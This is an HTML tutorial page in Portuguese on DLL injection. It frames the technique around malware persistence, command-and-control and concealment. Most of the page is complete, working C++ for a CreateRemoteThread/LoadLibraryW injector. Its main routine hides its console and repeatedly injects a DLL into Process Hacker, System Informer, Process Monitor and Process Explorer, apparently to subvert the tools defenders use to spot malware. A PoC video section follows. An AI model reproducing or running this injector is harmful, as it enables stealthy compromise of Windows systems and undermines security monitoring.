
<!DOCTYPE html>
<html lang="en">
<head>
    <style>
        body{
            background-color: black;
        }
        a{
            text-decoration: node;
            color: red;
            text-decoration-line: none;
            text-decoration-color: none;
        }
        a:hover{
            text-decoration: node;
            color: red;
            text-decoration-line: none;
            text-decoration-color: none;
        }
        .code-container {
            background-color: black;
            border: 1px solid #ff0000;
            padding: 10px;
            overflow-x: auto;
            max-width: 600px;
            max-height: 400px; /* Defina a altura máxima desejada */
        }
        code {
            display: block;
            white-space: pre;
        }
    </style>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ICS hacking</title>
</head>
<body>
<pre style="color: white">

             ,-----------------,              ,---------,
        ,------------------------,          ,"        ,"|
      ,"                       ,"|        ,"        ,"  |
     +------------------------+  |      ,"        ,"    |
     |  .------------------.  |  |     +---------+      |
     |  |                  |  |  |     | -==----'|      |
     |  | Dig1tal H3ll!    |  |  |     |         |      |
     |  | Bad command or   |  |  |/----|`---=    |      |
     |  | C:\>_ vithor.dll |  |  |   ,/|==== ooo |      ;
     |  |                  |  |  |  // |(((( [33]|    ,"
     |  `------------------'  |," .;'| |((((     |  ,"
     +-----------------------+   ;;  | |         |,"  
        /_)______________(_/   //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'

<a style="color: red">      [ Entendendo o DLL Injector na Pratica ]</a>

<a style="color: blue">[1]</a> O Que é um DLL Injector?

Um DLL Injector é uma ferramenta utilizada para injetar uma biblioteca de vínculo dinâmico (DLL) em um processo em execução. Uma DLL é um arquivo que contém código e dados compartilhados que podem ser utilizados por vários programas simultaneamente.
A injeção de DLL permite que um programa externo execute seu próprio código dentro de um processo em execução, o que pode ter vários propósitos. Por exemplo, um DLL Injector pode ser usado para modificar o comportamento de um programa, adicionando funcionalidades extras ou alterando sua lógica interna.
Essa técnica é especialmente popular pois permite a análise e manipulação de programas existentes.


<a style="color: blue">[2]</a> Exemplos Praticos

Persistência de Payloads: Um injetor de DLL pode ser usado para injetar código malicioso em um processo legítimo do sistema. Isso permite que um atacante mantenha acesso persistente ao sistema. 
O código injetado pode ser projetado para se comunicar com um servidor de comando e controle, fornecendo acesso contínuo ao invasor.
também pode ser usado para esconder a presença de um malware no sistema. Ele pode injetar código em um processo legítimo e mascarar a atividade maliciosa, tornando-o mais difícil de ser detectado.
Manipulação de Executáveis: Um injetor de DLL pode ser usado para modificar o comportamento de um executável. Por exemplo, um software legítimo pode ser modificado para executar código malicioso junto 
com suas funções normais.

<a style="color: blue">[3]</a> Codigo:

Função para Obter o ID do Processo por Nome:

<div class="code-container">
<div class="code">
DWORD GetProcessIdByName(const wstring& processName) {
    DWORD processId = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
    if (Process32First(snapshot, &processEntry)) {
        do {
            if (processName == processEntry.szExeFile) {
                processId = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    CloseHandle(snapshot);
    return processId;
}
</div></div>


Função para estarmos consequindo injetar uma DLL em um processo:

<div class="code-container" style="max-width: 900px; max-height: 1020px;">
<div class="code">
int InjectDll(DWORD processId, const wstring& dllPath) {
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (processHandle == NULL) {
        return -1;
    }

    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (loadLibraryAddress == NULL) {
        CloseHandle(processHandle);
        return -2;
    }

    size_t pathLength = (dllPath.size() + 1) * sizeof(wchar_t);
    LPVOID remoteDllPath = VirtualAllocEx(processHandle, NULL, pathLength, MEM_COMMIT, PAGE_READWRITE);
    if (remoteDllPath == NULL) {
        CloseHandle(processHandle);
        return -3;
    }

    if (!WriteProcessMemory(processHandle, remoteDllPath, dllPath.c_str(), pathLength, NULL)) {
        VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return -4;
    }

    HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, remoteDllPath, 0, NULL);
    if (threadHandle == NULL) {
        VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return -5;
    }

    WaitForSingleObject(threadHandle, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeThread(threadHandle, &exitCode);

    CloseHandle(threadHandle);
    VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);
    CloseHandle(processHandle);

    return exitCode;
}

</div></div>

Função principal responsável por ocultar o console, encontrar processos alvo e injetar uma DLL neles.

<div class="code-container" style="max-width: 900px; max-height: 1000px;">
    <div class="code">
int main() {
    FreeConsole();

    wchar_t currentDir[MAX_PATH];
    GetModuleFileName(NULL, currentDir, MAX_PATH);
    wstring currentDirStr(currentDir);
    wstring::size_type pos = currentDirStr.find_last_of(L"\/");
    if (pos == wstring::npos) {
        return -1;
    }
    wstring exeDir = currentDirStr.substr(0, pos + 1);

    wstring exeNames[] = { L"ProcessHacker.exe", L"SystemInformer.exe", L"procmon64.exe", L"", L"procexp64.exe" };
    const int numExes = sizeof(exeNames) / sizeof(wstring);

    wstring dllName = exeDir + L"vithor176.dll";

    while (true) {
        PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
        
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) {
            return -1;
        }
        if (!Process32First(snapshot, &processEntry)) {
            CloseHandle(snapshot);
            return -1;
        }
        do {
            for (int i = 0; i < numExes; i++) {
                if (_wcsicmp(processEntry.szExeFile, exeNames[i].c_str()) == 0) {
                    DWORD processId = processEntry.th32ProcessID;
                    int result = InjectDll(processId, dllName);
                    if (result < 0) {

                    }
                    else {

                    }
                }
            }
        } while (Process32Next(snapshot, &processEntry));
        CloseHandle(snapshot);

        Sleep(5000);
    }
}

    
    </div></div>

<a style="color: blue">[4]</a> O que fizemos até agora:

Parte 1: Obter o ID do processo por nome

Nesta parte do código, a função GetProcessIdByName é responsável por encontrar o ID de um processo com base em seu nome. Ela faz isso usando a API do Windows 
para criar uma "snapshot" de todos os processos em execução (CreateToolhelp32Snapshot) e, em seguida, percorre essa lista para encontrar o processo com o nome especificado.
CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0): Isso cria uma "snapshot" de todos os processos em execução no sistema.
Process32First(snapshot, &processEntry): Isso obtém o primeiro processo na lista de snapshot.
O loop do ... while percorre todos os processos na lista de snapshot e compara o nome do processo com o nome fornecido. Se houver uma correspondência, o ID desse processo é armazenado em processId.
Após encontrar o ID do processo desejado ou concluir a varredura de todos os processos, o código fecha o snapshot com CloseHandle(snapshot) e retorna o ID do processo encontrado.

Parte 2: Injetar uma DLL em um processo

A função InjectDll é usada para injetar uma DLL em um processo específico. Isso permite que a DLL forneça funcionalidades adicionais ao programa em execução.
OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId): Isso abre o processo alvo com permissões de acesso total.
GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW"): Isso obtém o endereço da função LoadLibraryW no kernel32.dll, que é usada para carregar a DLL no processo.
VirtualAllocEx(processHandle, NULL, pathLength, MEM_COMMIT, PAGE_READWRITE): Aloca espaço de memória no processo alvo para armazenar o caminho da DLL.
WriteProcessMemory(processHandle, remoteDllPath, dllPath.c_str(), pathLength, NULL): Isso escreve o caminho da DLL na memória do processo alvo.
CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, remoteDllPath, 0, NULL): Isso cria uma thread no processo alvo que executa LoadLibraryW com o caminho da DLL como argumento, carregando assim a DLL.
WaitForSingleObject(threadHandle, INFINITE): Aguarda até que a thread no processo alvo termine.
GetExitCodeThread(threadHandle, &exitCode): Obtém o código de saída da thread no processo alvo.
O código fecha os identificadores de thread e libera a memória alocada antes de encerrar.

Parte 3: Função principal

FreeConsole(): Isso oculta a janela do Console para que o usuário não veja a execução do programa.
GetModuleFileName(NULL, currentDir, MAX_PATH): Obtém o diretório do executável atual.
Define uma lista de nomes de processos (exeNames) que o código monitorará e uma variável que armazena o caminho da DLL a ser injetada (dllName).
Inicia um loop infinito que periodicamente verifica se os programas da lista estão em execução e, se estiverem, injeta a DLL neles usando a função InjectDll.
Sleep(5000): O programa aguarda por 5 segundos antes de verificar novamente, para não sobrecarregar o sistema com verificações constantes.


<a style="color: blue">[5]</a> PoC

<center>
<video width="640" height="360" controls>
    <source src="Untitled.mp4" type="video/mp4">
    Desculpe, o seu navegador não suporta este vídeo.
</video>
</center>
<a style="color: blue">[6]</a> Referencias:

    https://vxug.fakedoma.in/papers.html
    https://www.exploit-db.com/docs/english/13007-reflective-dll-injection.pdf
    https://inferi.zip/paper/dll-injection-na-pratica
    https://www.mentebinaria.com.br/artigos/tudo/o-que-%C3%A9-reflective-dll-injection-r86/